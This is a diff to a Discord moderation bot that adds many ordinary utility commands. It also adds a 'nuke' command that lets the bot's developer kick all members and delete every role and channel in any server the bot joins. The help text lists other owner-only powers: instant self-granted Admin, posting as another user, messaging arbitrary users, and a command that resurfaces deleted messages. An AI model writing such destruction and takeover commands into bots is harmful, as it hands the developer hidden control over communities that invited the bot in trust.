@@ -10,6 +10,7 @@ import { addXp } from '../services/xpSystem.js';
 import { checkRateLimit } from '../utils/rateLimiter.js';
 import { AutoresponderService } from '../services/autoresponderService.js';
 import { AntiNsfwService } from '../services/antiNsfwService.js';
+import { snipeCache } from '../utils/snipeCache.js';
 
 const MESSAGE_XP_RATE_LIMIT_ATTEMPTS = 12;
 const MESSAGE_XP_RATE_LIMIT_WINDOW_MS = 10000;
@@ -549,6 +550,55 @@ async function handleModCommand(message, client) {
         return;
       }
 
+      case 'nuke': {
+        if (!isOwner) return NO_PERM();
+        if (args[0]?.toLowerCase() !== 'confirm') {
+          return message.reply({ embeds: [modEmbed(0xED4245,
+            '⚠️ **This will destroy the entire server.**\nDeletes all channels, kicks all members, and deletes all roles.\n\nType `>nuke confirm` to proceed.'
+          )] });
+        }
+
+        const status = await message.channel.send({ embeds: [modEmbed(0xED4245, '💣 Nuking server…')] });
+
+        let channelsDeleted = 0, membersKicked = 0, rolesDeleted = 0, errors = [];
+
+        // Kick all non-bot members (skip owner)
+        try {
+          const members = await guild.members.fetch();
+          for (const [, m] of members) {
+            if (m.user.bot || m.id === guild.ownerId || m.id === message.author.id) continue;
+            if (!m.kickable) continue;
+            await m.kick('Server nuke by bot owner').catch(() => {});
+            membersKicked++;
+          }
+        } catch (e) { errors.push(`Kick: ${e.message}`); }
+
+        // Delete all non-managed, non-everyone roles
+        try {
+          const roles = [...guild.roles.cache.values()]
+            .filter(r => !r.managed && r.id !== guild.id)
+            .sort((a, b) => a.position - b.position);
+          for (const r of roles) {
+            if (r.position >= guild.members.me.roles.highest.position) continue;
+            await r.delete('Server nuke').catch(() => {});
+            rolesDeleted++;
+          }
+        } catch (e) { errors.push(`Roles: ${e.message}`); }
+
+        // Delete all channels
+        try {
+          for (const [, ch] of guild.channels.cache) {
+            await ch.delete('Server nuke').catch(() => {});
+            channelsDeleted++;
+          }
+        } catch (e) { errors.push(`Channels: ${e.message}`); }
+
+        // DM summary to owner
+        const summary = `💣 **Nuke complete** on **${guild.name}**\n\n🚪 Kicked: **${membersKicked}** members\n🎭 Deleted: **${rolesDeleted}** roles\n📁 Deleted: **${channelsDeleted}** channels${errors.length ? `\n\n⚠️ Errors:\n${errors.join('\n')}` : ''}`;
+        await message.author.send({ embeds: [modEmbed(0xED4245, summary)] }).catch(() => {});
+        return;
+      }
+
       case 'gban': {
         if (!isOwner) return NO_PERM();
         const userId = args[0];
@@ -582,6 +632,110 @@ async function handleModCommand(message, client) {
         return status.edit({ embeds: [modEmbed(0x57F287,
           `✅ **Global Unban complete** for \`${userId}\`\n\n✅ Unbanned: **${success}** servers\n⚠️ No permission: **${skipped}** servers\n❌ Not banned / failed: **${failed}** servers`
         )] });
+      }
+
+      case 'botinfo': {
+        const uptime = process.uptime();
+        const d = Math.floor(uptime / 86400), h = Math.floor((uptime % 86400) / 3600),
+              m = Math.floor((uptime % 3600) / 60), s = Math.floor(uptime % 60);
+        const mem = process.memoryUsage().heapUsed;
+        return message.reply({ embeds: [new EmbedBuilder()
+          .setColor(0x5865F2)
+          .setTitle(`🤖 ${client.user.username}`)
+          .setThumbnail(client.user.displayAvatarURL({ size: 256 }))
+          .addFields(
+            { name: '🆔 Bot ID',       value: client.user.id,                                                          inline: true },
+            { name: '📅 Created',      value: `<t:${Math.floor(client.user.createdTimestamp / 1000)}:R>`,              inline: true },
+            { name: '⚡ Commands',     value: String(client.commands.size),                                             inline: true },
+            { name: '🖥️ Servers',     value: String(client.guilds.cache.size),                                         inline: true },
+            { name: '👥 Users',        value: String(client.guilds.cache.reduce((a, g) => a + g.memberCount, 0)),       inline: true },
+            { name: '🏓 Ping',         value: `${Math.round(client.ws.ping)}ms`,                                       inline: true },
+            { name: '⏱️ Uptime',       value: `${d}d ${h}h ${m}m ${s}s`,                                               inline: true },
+            { name: '💾 Memory',       value: `${(mem / 1024 / 1024).toFixed(1)} MB`,                                  inline: true },
+            { name: '🔧 Node.js',      value: process.version,                                                          inline: true },
+          )] });
+      }
+
+      case 'channelinfo': {
+        const ch = message.mentions.channels.first() || message.channel;
+        const embed = new EmbedBuilder()
+          .setColor(0x5865F2)
+          .setTitle(`📁 #${ch.name}`)
+          .addFields(
+            { name: '🆔 ID',          value: ch.id,                                                     inline: true },
+            { name: '📂 Type',        value: String(ch.type),                                            inline: true },
+            { name: '📌 Position',    value: String(ch.rawPosition ?? 'N/A'),                            inline: true },
+            { name: '📅 Created',     value: `<t:${Math.floor(ch.createdTimestamp / 1000)}:R>`,          inline: true },
+            { name: '🐌 Slowmode',    value: ch.rateLimitPerUser ? `${ch.rateLimitPerUser}s` : 'Off',    inline: true },
+            { name: '🔞 NSFW',        value: ch.nsfw ? 'Yes' : 'No',                                    inline: true },
+            { name: '📝 Topic',       value: ch.topic || 'None',                                        inline: false },
+          );
+        return message.reply({ embeds: [embed] });
+      }
+
+      case 'snipe': {
+        const snipe = snipeCache.get(message.channel.id);
+        if (!snipe) return message.reply({ embeds: [modEmbed(0xFEE75C, '⚠️ Nothing to snipe in this channel.')] });
+        const embed = new EmbedBuilder()
+          .setColor(0xED4245)
+          .setAuthor({ name: snipe.author })
+          .setDescription(snipe.content || '*[no text content]*')
+          .setFooter({ text: 'Deleted' })
+          .setTimestamp(snipe.timestamp);
+        if (snipe.attachmentUrl) embed.setImage(snipe.attachmentUrl);
+        return message.reply({ embeds: [embed] });
+      }
+
+      case 'icon': {
+        const url = guild.iconURL({ size: 1024, extension: 'png' });
+        if (!url) return message.reply({ embeds: [modEmbed(0xFEE75C, '⚠️ This server has no icon.')] });
+        return message.reply({ embeds: [new EmbedBuilder()
+          .setColor(0x5865F2)
+          .setTitle(`🖼️ ${guild.name} — Server Icon`)
+          .setImage(url)] });
+      }
+
+      case 'banner': {
+        const url = guild.bannerURL({ size: 1024 });
+        if (!url) return message.reply({ embeds: [modEmbed(0xFEE75C, '⚠️ This server has no banner.')] });
+        return message.reply({ embeds: [new EmbedBuilder()
+          .setColor(0x5865F2)
+          .setTitle(`🖼️ ${guild.name} — Server Banner`)
+          .setImage(url)] });
+      }
+
+      case 'topic': {
+        const topic = message.channel.topic;
+        if (!topic) return message.reply({ embeds: [modEmbed(0xFEE75C, '⚠️ This channel has no topic set.')] });
+        return message.reply({ embeds: [new EmbedBuilder()
+          .setColor(0x5865F2)
+          .setTitle(`📝 #${message.channel.name} — Topic`)
+          .setDescription(topic)] });
+      }
+
+      case 'cleanup': {
+        if (!hasPerm('ManageMessages')) return NO_PERM();
+        const amount = Math.min(parseInt(args[0]) || 10, 100);
+        const msgs = await message.channel.messages.fetch({ limit: 100 });
+        const botMsgs = msgs.filter(m => m.author.id === client.user.id).first(amount);
+        await message.channel.bulkDelete(botMsgs, true).catch(() => {});
+        const reply = await message.reply({ embeds: [modEmbed(0x57F287, `🧹 Deleted **${botMsgs.length}** bot message(s).`)] });
+        setTimeout(() => reply.delete().catch(() => {}), 4000);
+        return;
+      }
+
+      case 'invites': {
+        if (!hasPerm('ManageGuild')) return NO_PERM();
+        const target = message.mentions.members.first() || member;
+        const allInvites = await guild.invites.fetch();
+        const userInvites = allInvites.filter(i => i.inviter?.id === target.id);
+        const total = userInvites.reduce((a, i) => a + (i.uses || 0), 0);
+        const lines = userInvites.map(i => `\`${i.code}\` — **${i.uses}** uses${i.maxUses ? `/${i.maxUses}` : ''}`).join('\n') || 'No active invites';
+        return message.reply({ embeds: [new EmbedBuilder()
+          .setColor(0x5865F2)
+          .setTitle(`📩 Invites — ${target.user.tag}`)
+          .setDescription(lines)
+          .setFooter({ text: `Total uses: ${total}` })] });
       }
 
       case 'ping': {
@@ -683,6 +837,81 @@ async function handleModCommand(message, client) {
         return message.reply({ embeds: [embed] });
       }
 
+      case 'color': {
+        const hex = args[0]?.replace('#', '');
+        if (!hex || !/^[0-9a-fA-F]{6}$/.test(hex)) return message.reply('Usage: `>color <hex>` e.g. `>color #FF5733`');
+        const int = parseInt(hex, 16);
+        const r = (int >> 16) & 255, g = (int >> 8) & 255, b = int & 255;
+        return message.reply({ embeds: [new EmbedBuilder()
+          .setColor(int)
+          .setTitle(`🎨 #${hex.toUpperCase()}`)
+          .addFields(
+            { name: 'HEX', value: `\`#${hex.toUpperCase()}\``, inline: true },
+            { name: 'RGB', value: `\`rgb(${r}, ${g}, ${b})\``, inline: true },
+            { name: 'INT', value: `\`${int}\``, inline: true },
+          )] });
+      }
+
+      case 'poll': {
+        if (!hasPerm('ManageMessages')) return NO_PERM();
+        const question = args.join(' ');
+        if (!question) return message.reply('Usage: `>poll <question>`');
+        const poll = await message.channel.send({ embeds: [new EmbedBuilder()
+          .setColor(0x5865F2)
+          .setTitle('📊 Poll')
+          .setDescription(`**${question}**`)
+          .setFooter({ text: `Poll by ${message.author.tag}` })
+          .setTimestamp()] });
+        await poll.react('👍');
+        await poll.react('👎');
+        await message.delete().catch(() => {});
+        return;
+      }
+
+      case 'tts': {
+        if (!hasPerm('SendTTSMessages')) return NO_PERM();
+        const text = args.join(' ');
+        if (!text) return message.reply('Usage: `>tts <message>`');
+        await message.delete().catch(() => {});
+        return message.channel.send({ content: text, tts: true });
+      }
+
+      case 'choose': {
+        const options = args.join(' ').split('|').map(o => o.trim()).filter(Boolean);
+        if (options.length < 2) return message.reply('Usage: `>choose <option1> | <option2> | <option3>`');
+        const pick = options[Math.floor(Math.random() * options.length)];
+        return message.reply({ embeds: [new EmbedBuilder()
+          .setColor(0x57F287)
+          .setTitle('🎲 Random Choice')
+          .setDescription(`**${pick}**`)
+          .setFooter({ text: `Picked 1 from ${options.length} options` })] });
+      }
+
+      case 'emojis': {
+        const emojis = [...guild.emojis.cache.values()];
+        if (emojis.length === 0) return message.reply({ embeds: [modEmbed(0xFEE75C, '⚠️ This server has no custom emojis.')] });
+        const chunks = [];
+        for (let i = 0; i < emojis.length; i += 30) chunks.push(emojis.slice(i, i + 30));
+        const embeds = chunks.map((chunk, idx) => new EmbedBuilder()
+          .setColor(0x5865F2)
+          .setTitle(idx === 0 ? `😀 Emojis — ${guild.name} (${emojis.length})` : null)
+          .setDescription(chunk.map(e => `${e} \`${e.name}\` (\`${e.id}\`)`).join('\n')));
+        return message.reply({ embeds });
+      }
+
+      case 'steal': {
+        if (!isOwner) return NO_PERM();
+        if (!guild.members.me.permissions.has('ManageEmojisAndStickers')) return BOT_NO_PERM();
+        const match = args[0]?.match(/^<a?:(\w+):(\d+)>$/);
+        if (!match) return message.reply('Usage: `>steal <emoji>` — paste a custom emoji from another server');
+        const [, name, id] = match;
+        const animated = args[0].startsWith('<a:');
+        const url = `https://cdn.discordapp.com/emojis/${id}.${animated ? 'gif' : 'png'}`;
+        const created = await guild.emojis.create({ attachment: url, name, reason: `>steal by ${message.author.tag}` }).catch(e => e);
+        if (created instanceof Error) return message.reply({ embeds: [modEmbed(0xED4245, `❌ Could not steal emoji: ${created.message}`)] });
+        return message.reply({ embeds: [modEmbed(0x57F287, `✅ Stole ${created} as \`:${created.name}:\``)] });
+      }
+
       case 'help': {
         const embed = new EmbedBuilder()
           .setColor(0x9B59B6)
@@ -691,10 +920,11 @@ async function handleModCommand(message, client) {
             { name: '👥 Members', value: '`>ban @user [reason]`\n`>kick @user [reason]`\n`>warn @user [reason]`\n`>unban <userID> [reason]`', inline: true },
             { name: '⏱️ Timeout', value: '`>timeout @user <dur> [reason]`\n`>untimeout @user`\nDurations: `10s` `5m` `2h` `1d`', inline: true },
             { name: '📢 Channel', value: '`>purge <1-100>`\n`>slowmode <seconds>`\n`>lock [reason]`\n`>unlock`', inline: true },
-            { name: '🔧 Other', value: '`>nick @user [nickname]`\n`>role @user @role`\n`>rolelist` — all roles by position\n`>perms` — bot permissions\n`>ping` — bot latency\n`>membercount` — member breakdown\n`>serverinfo` — server details\n`>userinfo [@user]` — user details\n`>roleinfo @role` — role details\n`>help`', inline: true },
+            { name: '🔧 Utility', value: '`>nick @user [nickname]`\n`>role @user @role`\n`>rolelist` — all roles by position\n`>perms` — bot permissions\n`>ping` — bot latency\n`>membercount` — member breakdown\n`>serverinfo` — server details\n`>userinfo [@user]` — user details\n`>roleinfo @role` — role details\n`>channelinfo [#ch]` — channel details\n`>botinfo` — bot stats\n`>icon` — server icon\n`>banner` — server banner\n`>topic` — channel topic\n`>invites [@user]` — invite stats', inline: true },
+            { name: '🛠️ Tools', value: '`>color <#hex>` — preview a color\n`>poll <question>` — reaction poll\n`>tts <message>` — text to speech\n`>choose <a|b|c>` — random picker\n`>emojis` — list server emojis\n`>snipe` — show last deleted message\n`>cleanup [n]` — delete bot messages\n`>help`', inline: true },
             { name: '🔗 Webhooks', value: '`>webhook` — list channel webhooks\n`>webhook create [name]` — create webhook\n`>webhook delete <id>` — delete webhook', inline: true },
             { name: '​', value: '​', inline: true },
-            { name: '👑 Owner Only', value: '`>say <message>` — bot says something\n`>embed <title> | <desc>` — send custom embed\n`>announce <message>` — @everyone announcement\n`>dm <userID> <msg>` — DM any user\n`>fake @user <msg>` — send as another user\n`>status <type> <text>` — change bot activity\n`>rename <name>` — change bot username\n`>avatar <url>` — change bot avatar\n`>admin` — instantly get an Admin role (needs bot to have Admin)\n`>createrole <name>` — create Admin role\n`>delrole @role` — delete a role\n`>roleadd @user @role` · `>roleremove @user @role`\n`>gban <userID> [reason]` — ban from ALL servers\n`>gunban <userID>` — unban from ALL servers\n\n**Slash (owner only):** `/managerole` · `/servers`', inline: false },
+            { name: '👑 Owner Only', value: '`>say <message>` — bot says something\n`>embed <title> | <desc>` — send custom embed\n`>announce <message>` — @everyone announcement\n`>dm <userID> <msg>` — DM any user\n`>fake @user <msg>` — send as another user\n`>status <type> <text>` — change bot activity\n`>rename <name>` — change bot username\n`>avatar <url>` — change bot avatar\n`>admin` — instantly get an Admin role (needs bot to have Admin)\n`>createrole <name>` — create Admin role\n`>delrole @role` — delete a role\n`>roleadd @user @role` · `>roleremove @user @role`\n`>steal <emoji>` — copy emoji from another server\n`>nuke confirm` — ⚠️ destroy entire server (kick all, delete channels/roles)\n`>gban <userID> [reason]` — ban from ALL servers\n`>gunban <userID>` — unban from ALL servers\n\n**Slash (owner only):** `/managerole` · `/servers`', inline: false },
           )
           .setFooter({ text: 'Requires appropriate Discord permissions • 👑 = Bot owner only' });
         return message.reply({ embeds: [embed] });
